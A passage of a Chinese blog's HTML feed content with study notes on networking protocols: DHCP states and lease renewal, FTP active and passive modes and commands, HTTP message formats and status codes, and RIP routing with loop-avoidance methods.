/><p><strong>一、初始化状态：</strong></p><ul><li>当DHCP客户端首次启动时，它处于初始化状态。客户使用向UDP端口67<strong>广播DHCPDISCOVER报文</strong>（带有DHCPDISCOVER选项的请求报文)。</li></ul><p><strong>二、选择状态：</strong></p><ul><li>发送DHCPDISCOVER报文后，客户就进入<strong>选择状态</strong>。收到请求报文的服务器用<strong>DHCPOFFER报文</strong>进行响应，提供了IP地址和租用时间，同时，服务器把提供的IP地址锁定，使这个地址不再提供给其它客户。</li><li>如果客户没有收到DHCPOFFER报文，它就再尝试4次，每次间隔2s，如果仍然没有应答，客户就睡眠300s后再试 </li></ul><p><strong>三、 请求状态 ：</strong></p><ul><li>客户选择多个DHCP服务器所提供的地址中的一个，并广播发送<strong>DHCPREQUEST报文</strong>，然后进入请求状态。</li><li>客户在请求状态等待，直到收到服务器的DHCPACK报文，然后客户进入绑定状态。 </li></ul><p><strong>四、绑定状态：</strong></p><ul><li>绑定状态下，客户在租用时间到期之前可以使用这个IP地址。当租用时间到达<strong>50%<strong>时，客户发送另一个DHCPREQUEST报文请求更新，进入</strong>更新状态</strong>。</li><li>在绑定状态，客户也可以使用<strong>DHCPRELEASE</strong>报文取消租用，进入初始化状态。</li></ul><p><strong>五、更新状态：</strong></p><ul><li><p>在更新状态下，如果客户收到更新租用的DHCPACK报文，就把计时器复位，然后回到绑定状态。</p></li><li><p>如果没有收到DHCPACK报文，且租用时间已到达87.5%，客户将再次向服务器发送DHCPREQUEST报文，进入重新绑定状态。 </p></li></ul><h4 id="DHCP运行过程"><a href="#DHCP运行过程" class="headerlink" title="DHCP运行过程"></a>DHCP运行过程</h4><p><strong>一、发现阶段：</strong></p><ul><li>DHCP客户寻找DHCP服务器的阶段。DHCP客户以广播方式发送DHCPDISCOVER报文来寻找DHCP服务器。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP发现阶段.png" style="zoom:67%;" /><p><strong>二、提供阶段：</strong></p><ul><li><p>服务器向DHCP客户提供lP地址的阶段。网络中收到<strong>DHCPDISCOVER</strong>的DHCP服务器都会做出响应，从尚未出租的IP中挑选一个分配给客户，向客户发送一个包含出租的IP地址和其它设置的<strong>DHCPOFFER</strong>报文。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP提供阶段.png" style="zoom:67%;" /></li></ul><p><strong>三、选择阶段：</strong></p><ul><li><p>DHCP客户端选择某台DHCP服务器提供的IP地址的阶段。</p></li><li><p>如果有多台DHCP服务器向DHCP客户端发来的DHCPOFFER提供报文，则DHCP客户只接受第一个收到的DHCPOFFER提供报文，然后它就以广播方式回答一个DHCPREQUEST请求报文，该报文中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP选择阶段.png" style="zoom: 80%;" /></li></ul><p><strong>四、确认阶段：</strong></p><ul><li><p>DHCP服务器确认所提供的IP地址的阶段</p></li><li><p>当DHCP服务器收到DHCP客户回答的DHCPREQUEST请求报文之后，它便向DHCP客户发送一个包含它所提供的IP地址和其它设置的DHCPACK确认报文，告诉DHCP客户可以使用它所提供的IP地址。然后DHCP客户便将其TCP/IP协议与网卡绑定，另外，除DHCP客户选中的服务器外，其它DHCP服务器都收回曾提供的IP地址</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP确认阶段.png" style="zoom:80%;" /></li></ul><p><strong>五、重新登录：</strong></p><ul><li>以后DHCP客户每次重新登录网络时，就不需要再发送DHCPDISCOVER报文了，而是直接发送含有前一次所分配的IP地址的DHCPREQUEST请求报文。当服务器收到这一报文后，它会尝试让客户继续使用原来的IP地址，并回答一个DHCPACK确认报文。</li><li>如果此IP地址已无法再分配给原来的客户时，服务器给客户回答一个DHCPNACK否认报文。原来的客户收到否认报文后，必须重新发送DHCPDISCOVER报文来请求新的IP地址。</li></ul><p><strong>六、更新租约：</strong></p><ul><li>服务器给客户的IP地址有一个租借期限，期满后服务器会收回IP地址。如果客户要延长其IP租约，则必须更新租约。当时间到了租约期限的50%时，客户会自动向服务器发送更新其IP租约的DHCPREQUEST报文。</li></ul><h2 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#掌握FTP的工作原理</span><span class="token comment">#掌握FTP常用命令的使用方法及用途</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TFP简介："><a href="#TFP简介：" class="headerlink" title="TFP简介："></a>TFP简介：</h3><p><strong>FTP (File Transfer Protocol）服务：</strong></p><p>FTP是TCP/IP网络上两台计算机之间传送文件的协议，它是在Internet上最早使用的协议之一。</p><blockquote><p style="color:blue;">FTP客户机可以给服务器发出命令来下载文件、上传文件、创建或改变服务器上的目录</p></blockquote><ul><li>原来的FTP软件多是命令行操作，有了像Filezilla这样的图形界面软件，使用FTP传输变得方便易学。</li><li>大多数FTP服务面向大众，不需要身份认证，即“匿名FTP服务器”。</li></ul><blockquote><p style="color:orange;">FTP协议是应用层的协议，它基于运输层，负责进行文件的传输</p></blockquote><ul><li>FTP是一个8位的客户端-服务器协议，能操作任何类型的文件而不需要进一步处理。</li><li>FTP服务<strong>一般运行在TCP的20和21两个端口</strong>。端口20用于在客户端和服务器之间<strong>传输数据流</strong>，而端口21用于<strong>传输控制流</strong>，并且是命令通向ftp服务器的入口</li></ul><h3 id="两种TCP连接"><a href="#两种TCP连接" class="headerlink" title="两种TCP连接"></a>两种TCP连接</h3><blockquote><p>控制连接:建立之后一直持续到客户和服务器间的通信完成为止，用于传送控制命令，服务器使用21号端口</p></blockquote><blockquote><p>数据连接:根据通信的需要随时建立和释放，用于数据传输，服务器通常使用20号端口</p></blockquote><h5 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接:"></a>控制连接:</h5><p>创建步骤:服务器在熟知端口21发出被动打开，等待客户，客户使用临时端口发出主动打开。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/创建TCP连接.png" style="zoom:67%;" /><h5 id="数据连接："><a href="#数据连接：" class="headerlink" title="数据连接："></a>数据连接：</h5><ul><li><strong>主动模式</strong>(PORT)由服务器端向客户端发起数据连接</li><li><strong>被动模式</strong>(PASV)由客户端向服务器端发起数据连接</li></ul><blockquote><p style="color:orange;">主动模式是服务器主动连接客户的数据端口，被动模式是服务器被动地等待客户连接自己的数据端口</p></blockquote><h4 id="主动模式下的FTP服务"><a href="#主动模式下的FTP服务" class="headerlink" title="主动模式下的FTP服务"></a>主动模式下的FTP服务</h4><p><strong>PORT(主动)模式的默认数据端口是20，控制端口是21</strong></p><ul><li><strong>连接过程</strong><ul><li>连接时，客户端使用随机的端口N(N&gt;1024)连接服务器的控制端口21建立控制连接</li><li>然后客户端开放N+1号端口进行监听，并通过控制连接向服务器发送命令PORT N+1</li><li>服务器用自己的数据端口20连接到客户端的N+1端口，建立数据连接。</li></ul></li></ul><h5 id="主动模式存在的问题："><a href="#主动模式存在的问题：" class="headerlink" title="主动模式存在的问题："></a>主动模式存在的问题：</h5><blockquote><p style="color:orange;">PORT(主动)模式发送端口给服务器，由服务器连回客户端</p></blockquote><ol><li>如果客户端有防火墙，这样的连接会被认为是外部主机试图连接内部的主机，通常情况下是不允许的</li><li>为了解决这个问题，引入了PASV（被动）模式。</li></ol><h4 id="被动模式下的FTP服务"><a href="#被动模式下的FTP服务" class="headerlink" title="被动模式下的FTP服务"></a>被动模式下的FTP服务</h4><ul><li><p>连接过程</p><ul><li>连接时，客户端使用一个随机的端口N(N&gt;1024)连接服务器的21端口建立控制连接</li><li>通过控制连接向服务器发送命令PASV (被动模式)。</li><li>服务器使用一个随机的数据端口M(M&gt;1024)并通过控制连接发回客户端</li><li>客户端用数据端口N+1连接服务器的端口M。</li></ul><p>由于是客户端主动发起数据连接，这样就解决了防火墙带来的问题。</p></li></ul><h3 id="FTP通信："><a href="#FTP通信：" class="headerlink" title="FTP通信："></a>FTP通信：</h3><p><strong>控制连接上的通信：</strong>FTP使用NVT ASCII字符集在控制连接上通信。通信过程使用命令和响应来完成，命令和响应都是一个短行，因此不必考虑它的文件结构。每一行以回车换行结束</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP控制链路上的通信.png" style="zoom:50%;" /><p><strong>数据连接上的通信：</strong>在传送数据之前，客户使用控制连接来做传输准备，定义文件类型、数据结构、传输方式</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP数据连接上的通信.png" style="zoom:50%;" /><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ol><li>ASCII文件:传送文本文件的默认格式。每一个字符使用NVT ASCII进行编码。发送端把文件从它自己的表示转换成NVT ASCII字符，而接收端从NVT ASCII字符转换成它自己的字符</li><li>EBCDIC文件:若连接的一端或两端使用EBCDIC编码，则可使用EBCDIC编码传送文件</li><li>图像文件:传送二进制文件的默认格式。这种文件是作为连续的比特流传送而没有任何解释或编码。在大多数情况下它用来传送二进制文件，如已编译的程序。</li></ol><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><ul><li>文件结构（默认)︰这种文件没有结构，它是连续的字节流</li><li>记录结构:这种文件划分为一些记录，这只能用于文本文件</li><li>页面结构:这种文件划分为一些页面，每一个页面有页面号和页面首部。页面可以随机地或顺序地进行存取</li></ul><h4 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h4><blockquote><p>流方式:这是默认方式。数据作为连续的字节流从FTP交付给TCP。TCP负责把数据划分为适当大小的报文。若数据是简单的字节流（文件结构），就不需要文件结束符。若数据划分为记录（记录结构)，则每一个记录有1字节的记录结束（EOR）字符，而在文件的结束处有文件结束（EOF）字符。</p></blockquote><blockquote><p>块方式:数据可以按块从FTP交付给TCP。每一个块的前面有3字节首部。第一个字节叫做块描述符，后两个字节定义块的大小，以字节为单位。</p></blockquote><blockquote><p>压缩方式:若文件很大，数据可进行压缩。通常使用的压缩方法是游程长度编码。数据单元的连续出现数可以用一个“出现”和“重复数”来替换。在文本文件中，这通常是空格。在二进制文件中，空字符常常被压缩。</p></blockquote><h4 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h4><blockquote><p>从服务器把文件复制到客户端叫做<strong>读取</strong>文件，使用RETR命令完成</p></blockquote><blockquote><p>从客户端把文件复制到服务器叫做<strong>存储</strong>文件，使用STOR命令完成。</p></blockquote><p>从服务器向客户端发送目录列表或文件名，使用LIST命令完成。FTP把目录或文件名列表当作文件，在数据连接上发送。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP文件传送.png" style="zoom:67%;" /><h3 id="FTP响应与命令："><a href="#FTP响应与命令：" class="headerlink" title="FTP响应与命令："></a>FTP响应与命令：</h3><blockquote><p style="color:blue;">FTP使用控制连接在客户进程和服务器进程之间完成交互操作，客户端向服务器发送命令，服务器给客户返回响应</p></blockquote><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><ul><li>命令形式是ASCII大写字符，后面的变量可以有，也可以没有。</li><li>命令可以粗略地划分为6组:接口命令、文件管理命令、数据格式化命端口定义命令、文件传送命令以及杂项命令。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP命令.png" style="zoom: 50%;" /><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><blockquote><p style="color:blue;">每一个FTP命令都应该有响应。响应由两个部分组成:3个数字以及跟随在后面的文本。数字部分定义代码，文本部分定义所需的参数或额外的解释</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/FTP相应.png" style="zoom:67%;" /><h2 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握HTTP的报文格式</span><span class="token comment">#掌握HTTP的工作原理</span><span class="token comment">#掌握HTTP常用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万维网体系结构"><a href="#万维网体系结构" class="headerlink" title="万维网体系结构"></a>万维网体系结构</h3><p>万维网，全称为World Wide Web，是一个由许多互相链接的超文本组成的系统，通过互联网访问。</p><ul><li>在这个系统中，每个有用的事物，称为“资源”，由全局“统一资源标识符(URL)”标识;这些资源通过超文本传输协议传送给用户，用户通过点击超链接来获得资源</li><li>每一个网站保存有一个或多个文档，叫做万维网页面。浏览器用来读取万维网上的文档<ul><li>客户需要查看网站A的某些信息，它向网站A发送一个请求，请求包含了网站A和其中万维网页面的地址，称为统一资源定位符(URL)</li><li>网站A收到请求后，将指定的文档发送给这个客户。</li></ul></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/用户访问万维网示意图.png" style="zoom:67%;" /><center>用户访问万维网的示意图</center>> <p style="color:orange;">WWW服务是分布式的客户/服务器模式</p><p><strong>浏览器：</strong>客户端程序，可以解释和显示万维网页面。</p><p><strong>服务器：</strong></p><blockquote><ul><li>万维网页面存储在服务器上，当客户请求到达时，对应的页面就发送给客户</li><li>为了提高效率，服务器通常在其高速缓存中存放被请求过的页面</li><li>通过多线程或多进程可使服务器的效率更加提高，服务器在同一时间可回答多个请求</li></ul></blockquote><h4 id="统一资源定位符（URL"><a href="#统一资源定位符（URL" class="headerlink" title="统一资源定位符（URL)"></a>统一资源定位符（URL)</h4><blockquote><p style="color:orange;">Uniform Resource Locator，用于表示Internet上资源的位置和访问方法</p></blockquote><ul><li><p>URL由4部分组成:</p><ol><li><p><strong>协议</strong>:指定了用这个URL的客户/服务器程序。如，HTTP、FTP和TELNET等</p></li><li><p>主机:指明了信息所存放的地址，可以是逻辑地址也可以是相应的域名</p></li><li><p>端口:指定了使用主机的某个端口，端口是可选的。</p><blockquote><p style="color:blue;">如果包含了端口，那么端口就插入在主机和路径之间，和主机用冒号分隔开</p></blockquote></li><li><p>路径:指定了文件存放的位置。路径本身可以包含斜线，用于将目录与子目录和文件分隔开。</p></li></ol></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/统一资源定位符.png" style="zoom:50%;" /><center>统一资源定位符格式:</center>##### 静态文档<p>内容固定的文档，由服务器创建。文档的内容是在创建文档时就确定的，而不是在使用它时。</p><h5 id="动态文档"><a href="#动态文档" class="headerlink" title="动态文档"></a>动态文档</h5><p>在浏览器请求该文档时才由万维网服务器创建出来。当请水到丛的，力维网服务器就运行创建动态文档的应用程序。服务器返回这个程序或脚本的输出，把它作为对请求该文档的浏览器的响应。<br>对每个请求都创建出新的文档，所以每个请求得到的动态文档内容可能不同。</p><h5 id="活动文档"><a href="#活动文档" class="headerlink" title="活动文档"></a>活动文档</h5><p>有些文档需要程序在客户端运行，称为活动文档。当浏览器请求活动文档时，服务器就发送这个文档的一个副本或脚本，然后这个文档就在客户（浏览器)端运行。</p><h3 id="HTTP报文格式："><a href="#HTTP报文格式：" class="headerlink" title="HTTP报文格式："></a>HTTP报文格式：</h3><p>超文本传输协议，Hyperlext Transfer Protocol，用于访问万维网上的数据</p><p>它是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>协议以普通文本、超文本、音频、视频等格式传输数据，它可以快速的在文档之间跳转</p><ul><li><blockquote><p style="color:orange;">HTTP是一个应用层协议，它使用TCP连接进行可靠的传送，在熟知端口80上提供服务。</p></blockquote></li></ul><blockquote><p style="color:black;">HTTP报文有两种类型:请求报文和响应报文</p>- 两种报文格式只有开始行不同。</blockquote><ul><li><p>首部行</p><ul><li>用来说明浏览器、服务器或报文主体的一些信息。</li><li>由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，结束的地方都要有回车换行</li><li>首部可以有好几行，但也可以不使用。</li><li>整个首部行结束时，还要有一个空行将首部行和后面的实体主体分</li></ul></li><li><p>实体主体</p><ul><li>在请求报文中一般不用，而在响应报文中也可能没有这个字段</li></ul></li></ul><h4 id="HTTP请求报文："><a href="#HTTP请求报文：" class="headerlink" title="HTTP请求报文："></a>HTTP请求报文：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP请求报文.png" style="zoom:67%;" /><ul><li><p>方法:</p><ul><li><p>常见的有GET和POST方法，在地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，POST方法要求服务器接受附在请求后面的数据，常用于提交表单。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP方法.png" style="zoom:67%;" /></li></ul></li><li><p>URL:向服务器请求的资源</p></li><li><p>HTTP版本:目前是http/1.1。</p></li><li><p>首部字段：</p><ul><li>Accept:指定客户端接受哪些类型的信息，如text/html,image/gif等</li><li>Accept-Language:指定一种自然语言。</li><li>Accept-Encoding:指定可接受的内容编码，如gzip, deflate。</li><li>User-Agent: 允许客户端将它的操作系统、浏览器和其它属性告诉服务器</li><li>Host:目标服务器</li><li>Connection:连接状态，如Keep-Alive，Close。</li></ul></li></ul><h4 id="HTTP回应报文"><a href="#HTTP回应报文" class="headerlink" title="HTTP回应报文"></a>HTTP回应报文</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP回应报文.png" style="zoom:67%;" /><ul><li><p>版本:与请求报文相同</p></li><li><p>状态码:表示服务器的响应类型，有三位数字组成，其中第一个数字定义了响应的类别，有五种可能取值:</p><blockquote><ul><li>1xx:通知信息—表示请求已接收，继续处理</li><li>2xx:成功—表示请求已被成功接收、理解、接受</li><li>3xx:重定向一用于已经移动的文件</li><li>4xx:客户端错误—请求有语法错误或请求无法实现</li><li>5xx:服务器端错误—服务器失效无法完成请求</li></ul></blockquote></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP协议状态码.png" style="zoom: 50%;" /><center>HTTP协议状态码：</center>- 短语:解释状态码的简单短语- 首部字段  - Date:消息产生时间  - Server:服务器用来处理请求的软件  - Set- cookie:设置Cookie及其路径  - Content-Length:实体正文的长度，十进制  - Connection:连接状态。  - Content-Type:发送给接收者的实体正文的媒体类型，如Content-Type:text/html;charset=GB2312。<h3 id="持久与非持久链接"><a href="#持久与非持久链接" class="headerlink" title="持久与非持久链接"></a>持久与非持久链接</h3><h4 id="非持久连接"><a href="#非持久连接" class="headerlink" title="非持久连接"></a>非持久连接</h4><ul><li>对每一个请求/响应都要建立一次TCP连接</li><li>非持久连接策略给服务器造成了很大的开销，因为服务器需要N个不同的缓存，而每次打开连接时都要使用慢开始过程</li><li>版本1.1以前的HTTP协议默认是非持久连接</li></ul><h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul><li><p>在使用持久连接时，服务器在发送响应后，让连接继续为一些请求打开</p></li><li><p>服务器可以在客户发送关闭请求时等待或关闭这个连接。</p></li><li><p>服务器可在相同的TCP连接上向客户发送多个对象</p><blockquote><p>HTTP版本1.1默认使用持久连接策略。</p></blockquote></li></ul><h3 id="万维网的工作过程："><a href="#万维网的工作过程：" class="headerlink" title="万维网的工作过程："></a>万维网的工作过程：</h3><p>每个万维网网点都有一个服务器,它不断地监听TCP的端口80，以便发现是否有浏览器（即万维网客户)向它发出连接建立请求。一旦监听到连接请求并建立了TCP连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后释放TCP连接。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/万维网工作过程.png" style="zoom:67%;" /><h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握路由协议的分类，理解静态路由和动态路由</span><span class="token comment">#掌握动态路由协议RIP的报文格式、工作原理及工作过程</span><span class="token comment">#掌握RIP计时器的作用</span><span class="token comment">#理解RIP的稳定性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、路由分类："><a href="#一、路由分类：" class="headerlink" title="一、路由分类："></a>一、路由分类：</h3><h4 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h4><h5 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择:"></a>路由选择:</h5><blockquote><p>在从源点到终点的通信过程中，数据包可能经过多个路由器，直到到达连接，目的网络路由器为止。<br>当路由器收到数据包时，它应当将数据包转发到哪一个网络，取决于路由表的信息。</p></blockquote><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表:"></a>路由表:</h5><blockquote><p>静态路由表:路由信息是管理员设置的，并由管理员手动进行更新。</p></blockquote><blockquote><p>动态路由表:路由信息是随着互联网的变化而自动更新的。</p></blockquote><p>**路由选择协议:**路由选择协议是一些规则和过程的组合。规则使得路由器之间能够共享他们所知道的互联网情况和邻站信息，而过程用来合并从其它路由器收到的信息。</p><h4 id="外部和内部路由选择："><a href="#外部和内部路由选择：" class="headerlink" title="外部和内部路由选择："></a>外部和内部路由选择：</h4><p><strong>自治系统（AS,Autonomous System)</strong><br>由同一个管理机构管理、使用统一路由策略的路由器的集合。<br>最初，自治系统内部只考虑运行单个路由协议;然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/自治系统.png" style="zoom:67%;" /><h5 id="两大类路由选择协议"><a href="#两大类路由选择协议" class="headerlink" title="两大类路由选择协议"></a>两大类路由选择协议</h5><p><strong>内部网关协议IGP(Interior Gateway Protocol)：</strong></p><blockquote><p style="color:blue;">内部网关协议IGP(Interior Gateway Protocol):在一个自治系统内部使用的路由选择协议</p>- 目前这类路由选择(域内路由选择)协议使用得最多，如**RIP**和**OSPF协议**。</blockquote><p><strong>外部网关协议EGP(External Gateway Protocol):</strong></p><blockquote><p style="color:blue;">外部网关协议EGP(External Gateway Protocol):在自治系统之间使用的路由选择协议</p>- 在外部网关协议中目前使用最多的是**BGP-4**协议</blockquote><h5 id="距离向量路由选择协议"><a href="#距离向量路由选择协议" class="headerlink" title="距离向量路由选择协议:"></a>距离向量路由选择协议:</h5><ol><li>从路由器到直接连接的网络的距离定义为1</li><li>从路由器到非直接连接的网络的距离定义为所经过的路由器数加1，因此也称为“跳数”</li><li>每个节点维护一个到其它节点的最小距离向量表</li><li>初始状态下，每个节点只知道到与它直接相连的节点的代价</li><li>节点周期性地向其所有相邻节点发送它的路由表信息</li><li>当一个节点从邻站收到路由表信息时，使用<strong>Bellman-Ford算法</strong>更新其路由表</li></ol><h3 id="二、RIP协议："><a href="#二、RIP协议：" class="headerlink" title="二、RIP协议："></a>二、RIP协议：</h3><h4 id="2-1：路由信息协议-Routing-Information-Protocol"><a href="#2-1：路由信息协议-Routing-Information-Protocol" class="headerlink" title="2.1：路由信息协议(Routing Information Protocol)"></a>2.1：路由信息协议(Routing Information Protocol)</h4><p>应用较早、使用较普遍的<strong>内部网关协议</strong>，适用于小型同类网络，是典型的<strong>距离向量路由协议</strong>。</p><blockquote><ul><li><p style="color:orange;">通过广播UDP协议520端口封装成的报文来交换路由信息，默认每30秒发送一次路由信息更新报文</p></li><li><p style="color:orange;">RIP使用跳数作为路由距离度量，即数据报到达目标设备所必须经过的路由器数目</p></li><li><p style="color:orange;">RIP最多支持的跳数为15，跳数16表示不可达</p></li></ul></blockquote><h5 id="RIP的工作原理"><a href="#RIP的工作原理" class="headerlink" title="RIP的工作原理"></a>RIP的工作原理</h5><ol><li>路由器启动时，路由表中只包含直通路由。运行RIP后，路由器会发送Request报文，用来请求邻居路由器的RIP路由</li><li>运行RIP的邻居路由器收到该Request报文后，会根据自己的路由表，生成Response报文进行回复</li><li>路由器在收到Response报文后，会将相应的路由添加到自己的路由表中</li><li>RIP网络稳定以后，每个路由器会<strong>周期性</strong>的向<strong>邻居路由器</strong>通稿自己的<strong>整张路由表</strong>中的路由信息，默认周期为30秒。邻居路由器根据收到的路由信息刷新自己的路由表</li><li>路由表中的每一路由项都对应了一个老化定时器，当路由项在180秒内没有任何更新时，定时器超时，该路由项的度量值变为不可达</li><li>某路由项的度量值变为不可达后，该路由会在Response报文中发布四次(120秒)，然后从路由表中清除。</li></ol><h5 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h5><p>仅和相邻路由器交换信息。</p><pre class="line-numbers language-none"><code class="language-none">交换的信息是当前本路由器所知道的全部信息，即自己的路由表按固定的时间间隔交换路由信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RIPv1-vs-RIPv2"><a href="#RIPv1-vs-RIPv2" class="headerlink" title="RIPv1 vs RIPv2"></a>RIPv1 vs RIPv2</h5><p><strong>RIPv1</strong></p><blockquote><p style="color:orange;">有类别路由协议，不支持VLSM和CIDR且不支持认证。以广播的形式发送报文，目的IP地址为广播地址255.255.255.255</p></blockquote><p><strong>RIPv2</strong></p><blockquote><p style="color:orange;">无类别路由协议，支持VLSM、路由聚合与CIDR，支持明文认证和MD5密文认证，以广播或者组播(224.0.0.9)方式发送报文</p></blockquote><h4 id="2-2：RIP协议报文格式："><a href="#2-2：RIP协议报文格式：" class="headerlink" title="2.2：RIP协议报文格式："></a>2.2：RIP协议报文格式：</h4><h5 id="RIPv1的报文格式："><a href="#RIPv1的报文格式：" class="headerlink" title="RIPv1的报文格式："></a>RIPv1的报文格式：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/RIPv1的报文格式.png" style="zoom:67%;" /><p> 每个字段的值和作用</p><blockquote><p>Command:表示该报文是一个请求报文还是响应报文，1表示该报文是请求报文，2表示该报文是响应报文</p><p>Version:表示RIP的版本信息。对于RIPv1，该字段的值为1</p><p>Address Family ldentifier (AFI):表示地址标识信息，对于IP协议，其值为2</p><p>lP address:表示该路由条目的目的IP地址。这一项可以是网络地址、主机地址</p><p>Metric:路由条目的度量值，取值范围1-16。</p></blockquote><blockquote><p style="color:blue;">一个RIP路由更新消息中最多可包含25条路由表项，每个路由表项都携带了目的网络的地址和度量值。整个RIP报文大小限制为不超过504字节，如果整个路由表的更新消息超过该大小，需要发送多个RIPv1报文</p></blockquote><h5 id="RIPv2的报文格式："><a href="#RIPv2的报文格式：" class="headerlink" title="RIPv2的报文格式："></a>RIPv2的报文格式：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/RIPv2的报文格式.png" style="zoom: 50%;" /><p><strong>RIPv1与RIPv2的不同的字段</strong></p><blockquote><p>AFI:地址族标识除了表示支持的协议类型外，还可以用来描述认证信息<br>Route tag:用于标记外部路由。<br>Subnet Mask:指定IP地址的子网掩码，定义IP地址的网络或子网部分<br>Next Hop:指定通往目的地址的下—跳IP地址。</p></blockquote><h3 id="三、RIP环路："><a href="#三、RIP环路：" class="headerlink" title="三、RIP环路："></a>三、RIP环路：</h3><p>RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络，度量值为2。<br>此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><h4 id="环路避免-水平分割"><a href="#环路避免-水平分割" class="headerlink" title="环路避免-水平分割"></a>环路避免-水平分割</h4><p>路由器从某个接口学到的路由，不会从该接口再发回给邻居路由器。</p><blockquote><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/水平分割.png" style="zoom:67%;" /><h4 id="环路避免-毒性反转"><a href="#环路避免-毒性反转" class="headerlink" title="环路避免-毒性反转"></a>环路避免-毒性反转</h4><p>毒性反转机制的实现可以使错误路由立即超时。<br>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/毒性反转.png" style="zoom:67%;" /><h4 id="环路避免-触发更新"><a href="#环路避免-触发更新" class="headerlink" title="环路避免-触发更新"></a>环路避免-触发更新</h4><p style="color:skyblue;">触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不需要等待更新定时器超时，从而加速了网络收敛</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/触发更新.png" style="zoom:67%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;地址解析协议-ARP&quot;&gt;&lt;a href=&quot;#地址解析协议-ARP&quot; class=&quot;headerlink&quot; title=&quot;地址解析协议 ARP&quot;&gt;&lt;/a&gt;地址解析协议 ARP&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
